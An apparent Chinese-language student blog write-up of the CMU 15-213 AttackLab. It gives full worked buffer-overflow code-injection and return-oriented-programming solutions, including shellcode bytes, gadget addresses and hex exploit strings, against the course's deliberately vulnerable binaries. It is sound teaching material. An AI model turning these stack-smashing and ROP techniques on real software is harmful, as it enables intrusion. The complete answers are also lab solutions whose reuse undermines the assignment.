---
title: AttackLab
date: 2024-08-16 11:11:49
categories:
- CMU15-213
index_img: /Pictures/CMU15-213/attacklab.jpg
banner_img: /Pictures/CMU15-213/attacklab.jpg
---

# AttackLab

## Lab概述：

学生们将获得名为` ctarget` 和 `rtarget` 的二进制文件，这些文件存在缓冲区溢出漏洞。他们被要求通过五种日益复杂的攻击来改变目标的行为。对 `ctarget` 的三种攻击使用代码注入。对 `rtarget` 的两种攻击使用面向返回编程。实验室提供以下资源：

1. **`ctarget`**：一个具有代码注入漏洞的 Linux 二进制文件，用于第 1-3 阶段的实验。
2. **`rtarget`**：一个具有 ROP 漏洞的 Linux 二进制文件，用于第 4-5 阶段的实验。
3. **`cookie.txt`**：包含本实验室实例所需的 4 字节签名。
4. **`farm.c`**：包含 `rtarget` 中使用的小工具的源代码，供学生编译和反汇编以寻找攻击所需的工具。 
5. **`hex2raw`**：一个实用程序，用于生成字节序列，帮助学生在实验中更容易地操作和注入代码。

**二进制文件：**

`ctarget`和`rtarget`都通过函数`getbuf`来接受输入字符串。

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

由于函数`Gets()`不能确定缓冲区大小是否足以储存`buf`字符串，因此可能导致缓冲区溢出的问题。

当键入的字符串足够短时，`ctarget`会返回1,反之会报错.

```bash
Cookie: 0x1a7dd803
Type string: Keep it short!
No exploit. Getbuf returned 0x1
Normal return
```

```bash
unix> ./ctarget
Cookie: 0x1a7dd803
Type string: This is not a very interesting string, but it has the property ...
Ouch!: You caused a segmentation fault!
Better luck next time
```

**HEX2RAW：**

HEX2RAW 将十六进制格式的字符串作为输入。在此格式中，每个字节值由两个十六进制数字表示。例如，字符串“012345”可以以十六进制格式输入“30 31 32 33 34 35 00”。传递给 HEX2RAW 的十六进制字符应以空格（空格或换行符）分隔。

**生成字节代码：**

使用GCC作为汇编器，使用OBJDUMP作为反汇编器，可以方便地生成指令序列的字节码。

汇编和反汇编操作：

```bash
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```



## Part I: Code Injection Attacks

### Level 1

在这一部分中，我们不需要加入新代码，只需要利用字符串重定向程序以执行现有过程。

在文件`ctarget`中，`getbuf`函数有以下的调用：

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

同时存在一个函数touch1：

```c
void touch1()
{
    vlevel = 1;
    printf("Touch1 !: You called touch1()\n");
    validate(1);
    exit(0);
}
```

在执行`getbuf`后，PC会返回到`test`函数中。我们想让`getbuf` 执行其 return 语句时执行` touch1 `的代码，而不是返回到` test`。

因此，我们的思路便很清晰了：找到`getbuf()`函数对应的汇编代码，在执行`ret`指令之前跳转到`touch1()`即可。

打断点并且反汇编：

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

注意到分配了0x28=40个字节大小的空间，因此我们只需要先填充40字节的无效字节，再将代码注入到后几个字节覆盖掉栈帧中压入的test函数的地址即可。

同时找到函数`touch1()`的入口地址：0x00000000004017c0

依据小端法，我们在最后填入c0 17 40。因此我们可以输入：

```markdown
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00
```

我们将其存入一个txt文件中，利用**HEX2RAW**转换后输入：

```bash
./hex2raw < level1.txt > ans1.txt
./ctarget -i ans1.txt -q
```

通过测试：

```bash
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
```

### Level 2

在`ctarget`中，有一个`touch2()`函数：

```c
void touch2(unsigned val)
{
    vlevel = 2;
    if (val == cookie)
    {
        printf("Touch2!:You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else 
    {
    	printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

我们在这一阶段需要做的便是利用`getbuf`调用`touch2`，但不同的是这次我们需要传递一个参数`val`。得到函数地址为0x00000000004017ec。

而函数的第一个参数储存在寄存器`%rdi`中，因此我们需要先将cookie值（此处为0x59b997fa）传到`%rdi`中，再调用`touch2`，汇编代码看起来是这样的：

```assembly
movq	$0x59b997fa,%rdi
call	touch2			
```

但根据要求不使用`call`和`jmp`指令，所以我们用`ret`指令来代替。

```assembly
movq	$0x59b997fa,%rdi
pushq	$0x4017ec	
retq
```

将这段代码进行汇编，再反汇编为字节码：

```bash
gcc -c level2.s
objdump -d level2.o > level2.byte
```

得到字节码：

```assembly
level2.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

我们便得到了注入的字节码，这些字节码会随着读取操作而进入数组`buf`中。下一步便是让程序计数器`%rip`跳转到`buf`的起始位置执行注入的代码，因此我们需要确定缓冲区的起始位置。这里我们实际跑一下代码，等待缓冲区设定完成后检查`%rsp`得到缓冲区起始位置：

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) info registers
rax            0x0                 0
rbx            0x55586000          1431855104
rcx            0x0                 0
rdx            0x5561dcc0          1432476864
rsi            0xf4                244
rdi            0x55685fd0          1432903632
rbp            0x55685fe8          0x55685fe8
rsp            0x5561dc78          0x5561dc78
```

可知缓冲区起始地址为0x5561dc78 

我们组装一下字节码：

```
48 c7 c7 fa 97 b9 59 
68 ec 17 40 00 
c3 
00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55
```

经检查无误。

### Level 3

level 3涉及两个函数：`hexmatch` 和 `touch3`

```c
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```

```c
void touch3(char *sval)
{
 	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

可以看到，我们这次不仅需要传递参数`val=cookie`，同时还需要传递一个字符串参数`sval`。

`char *s = cbuf + random() % 100`：随机指定`s`在`cbuf`中的起始位置。

`sprintf(s, "%.8x", val);`：使用 `sprintf` 函数将无符号整数 `val(cookie=0x59b997fa)` 转换成一个 8 位的十六进制字符串，存储在指针 `s` 所指向的位置。

`return strncmp(sval, s, 9) == 0;`：使用 `strncmp` 函数比较 `sval` 和 `s` 所指向的字符串，如果两个字符串的前 9 个字符完全相同，则返回 `1`，否则返回 `0`。

由于`hexmatch`函数自身申请了110字节空间，并且调用了其它库函数（一般所需内存较大），我们很容易注意到这些操作都会覆盖我们原来`getbuf`申请的栈空间，因此我们可以考虑将注入的代码存放在其它不会被覆盖的地方。

对应ASCII码，我们首先将cookie翻译为字符串：59b997fa => 35 39 62 39 39 37 66 61

然后考虑注入代码的逻辑，与level 2类似：

```assembly
pushq	$0x4018fa		
movq	$0x000000,%rdi	;这里这个立即数应当为存放字节代码的地址，暂定
retq
```

这里我们先将字符串保存在`%rsp+8`处看看情况如何（这里这么选的原因是）：

```assembly
Dump of assembler code for function touch3:
=> 0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)       
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        
   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
```

可以看到在`0x40184c`调用了函数`hexmatch`，我们在调用前后打断点，检测栈`0x5561dc78 `开始的地址即可：

```assembly
(gdb) x/20x 0x5561dc78
0x5561dc78:     0x4018fa68      0x7c8d4800      0xefc30824      0xefefefef
0x5561dc88:     0xefefefef      0xefefefef      0xefefefef      0xefefefef
0x5561dc98:     0xefefefef      0xefefefef      0x55586000      0x00000000
0x5561dca8:     0x39623935      0x61663739      0x00400000      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
```

可以看到，在`0x5561dca8`后面存放的8个字节就是我们的cookie字符串。

```assembly
(gdb) x/20x 0x5561dc78
0x5561dc78:     0x9b3b8d00      0xf82d828c      0x5561dca8      0x00000000
0x5561dc88:     0x55685fe8      0x00000000      0x00000004      0x00000000
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x39623935      0x61663739      0x00400000      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
```

运气比较好，并没有被覆盖。事实上，我们观察可以发现，在第三行`0x55586000`后的地址均不会被覆盖（实际上这里就是`ret`前`%rsp`指向的地址）。如果硬编码地址的话，我们选择`0x5561dca8`即可，再控制buf使其溢出到此位置即可。

```assembly
pushq	$0x4018fa		
movq	$0x5561dca8,%rdi	
retq
```

最终答案：

```
68 fa 18 40 00 
48 c7 c7 a8 dc 61 55 
c3 
ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

经检验正确无误。

## Part II: Return-Oriented Programming

在第二阶段，我们将使用ROP的模式来攻击`rtarget`文件。相比于`ctarget`，该文件采取了一些保护措施，例如栈地址随机化和部分栈内容是只读的，来防止代码注入攻击。因此我们采取*Return-Oriented Programming*的攻击方法。

该方法的原理是程序的汇编语言代码中，会出现我们需要的代码片段，只要我们进行适当的截取拼接，便能“凑”出我们的攻击代码，下面是一个例子：

```c
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
```

上述这段代码将一个unsigned指针的值改变成一个很奇怪的数字，我们观察它的汇编代码以及对应的字节码:

```assembly
0000000000400f15 <setval_210>:
  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
  400f1b:       c3                      retq
```

从地址`0x400f18`到`0x400f1b`的四个字节内容为`48 89 c7 c3`，翻译为汇编语言即为：

```assembly
movq	%rax,%rdi	 ;48 89 c7
ret					;c3
```

这样的片段我们称之为**gadget**，若我们在栈上放置一些精心设计的gadget地址，利用ret实现代码之间的跳转：

![stack](/Pictures/CMU15-213/rop.jpg)

就可以让程序运行一些我们所期望它运行的代码片段，从而可以绕过随机化栈地址和只读栈地址这种保护策略。

本题中有一个这样的代码仓库，叫做farm，题目要求我们利用farm里的gadget重新完成一遍level2和level3的攻击，也就是level4和level5。

下面是可能用到的代码对应的字节码：

![ByteEncoding](/Pictures/CMU15-213/ByteEncoding.png)

### Level 4

我们找回Level 2的汇编代码：

```assembly
movq	$0x59b997fa,%rdi
pushq	$0x4017ec	
retq
```

我们要做的便是将立即数cookie移到`%rdi`中。但是存在的问题是我们无法利用gadget直接构造cookie，这就说明我们只能手动传入cookie并储存在栈中，利用其它指令再进行调用。

在和栈进行数据交互的指令中，我们考虑`pushq`和`popq`指令。回忆一下这两个指令的功能：

| 指令    | 效果                               | 描述         |
| ------- | ---------------------------------- | ------------ |
| pushq S | R[%rsp]-8 → R[%rsp];S → M[R[%rsp]] | 将四字压入栈 |
| popq D  | M[R[%rsp]] → D;R[%rsp]+8 → R[%rsp] | 将四字弹出栈 |

我们发现`popq`指令可以实现将栈顶的四字储存到目标寄存器中，这就说明我们可以先将cookie传入栈顶，在利用该指令将其直接或间接传递到寄存器中，实现我们所需要的操作。

我们将farm转换为对应的字节码：

```bash
gcc -c farm.c
objdump -d farm.o > farm.s
```

得到farm中每个函数对应的字节码，方便我们构造gadget。

但是事实上当我得到转换之后的字节码时，我发现地址是从0x0000处开始的，这说明直接转换farm.c文件不能得出运行时对应gadget的地址😥

所以我们还是回到`rtarget`中，直接找到对应的地址：`objdump -d rtarget > rtarget.s`

定位如下片段：

```assembly
4019a7: 8d 87 51 73 58 90     lea -0x6fa78caf(%rdi), %eax
4019ad: c3                    retq
```

从`0x4019ab`到`0x4019ad`为`58 90 c3`，对应：

```assembly
popq	%rax
nop
ret
```

同样，定位如下片段：

```assembly
4019a0: 8d 87 48 89 c7 c3     lea -0x3c3876b8(%rdi), %eax
4019a6: c3                    retq
```

从`0x4019a2`到`0x4019a5`为`48 89 c7 c3`，对应：

```assembly
movq	%rax,%rdi
```

因此我们进行组装：

```
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
a2 19 40 00 00 00 00 00 
ec 17 40 00 00 00 00 00 
```

### Level 5

同样的，我们依然是先找出所需要进行的操作，再进行拼凑。

要复现Level 3 的操作，重点是定位字符串存储的位置。由于字符串的存放位置取决于我们前面的操作的数量，在这里用硬编码并不是一个好的选择，我们可以转换一下思路，利用`lea`指令，使用寄存器和偏移量来进行定位。

结合farm的现有指令，我们初步的设想是：

1. 先将`%rsp`地址存入`%rdi`，偏移量存入`%rsi`，先将计算后的地址保存在`%rax`中，再将`%rax`转移到`%rdi`中。这是源于farm中的代码：

   ```assembly
   00000000004019d6 <add_xy>:
     4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
     4019da:	c3                   	retq  
   ```

2. 计算偏移量，存入字符

3. 调用touch3

第一步无疑是最为繁琐的：

- `%rsp` => `%rax` => `%rdi`

  ```assembly
  0000000000401a03 <addval_190>:
    401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
    401a09:	c3                   	retq 
  
  00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3 
  ```

  可截取出`48 89 e0`和`48 89 c7`，对应地址为`401a06`和`4019c5`

- 偏移量（暂定为x） => `%rax`

  ```assembly
  00000000004019a7 <addval_219>:
    4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
    4019ad:	c3  
  ```

  截取`58 90 c3`为`popq %rax,ret`，地址为`4019ab`

  接下来的8字节存放我们的偏移量，被pop进入`%rax`

- `%eax` => `%edx` => `%ecx` => `%esi`

  ~~为什么要这么复杂，因为gadget很难截取啊qwq~~

  ```assembly
  0000000000401a40 <addval_487>:
    401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
    401a46:	c3
    
  0000000000401a33 <getval_159>:
    401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
    401a38:	c3 
  
  0000000000401a25 <addval_187>:
    401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
    401a2b:	c3  
  ```

  这三段分别对应三步，`89 c2`，`401a42`；`89 d1`，`401a34`；`89 ce`，`401a27`

- 执行`lea`指令得出地址，地址为`4019d6`

- 将地址从`%rax`转入`%rdi`

  ```assembly
  00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3 
  ```

  `48 89 c7`对应地址`4019c5`

- 调用`touch3`，地址为`4018fa`

- 计算偏移量，前面共有9条地址加一个偏移量，相对于buf数组多占80字节。由于`%rsp`指向buf大8字节的位置（之前储存返回test函数的地址的8字节），所以偏移量为72=0x48，在这里后面的8字节存放cookie。

组装起来：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00  <-- movq %rsp, %rax
c5 19 40 00 00 00 00 00  <-- movq %rax, %rdi
ab 19 40 00 00 00 00 00  <-- popq %rax
48 00 00 00 00 00 00 00  <-- 偏移量
42 1a 40 00 00 00 00 00  <-- movl %eax, %edx
34 1a 40 00 00 00 00 00  <-- movl %edx, %ecx
27 1a 40 00 00 00 00 00  <-- movl %ecx, %esi
d6 19 40 00 00 00 00 00  <-- lea  (%rdi,%rsi,1),%rax
c5 19 40 00 00 00 00 00  <-- movq %rax, %rdi
fa 18 40 00 00 00 00 00  <-- touch3
35 39 62 39 39 37 66 61  <-- cookie 值
```

结果：

```bash
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```

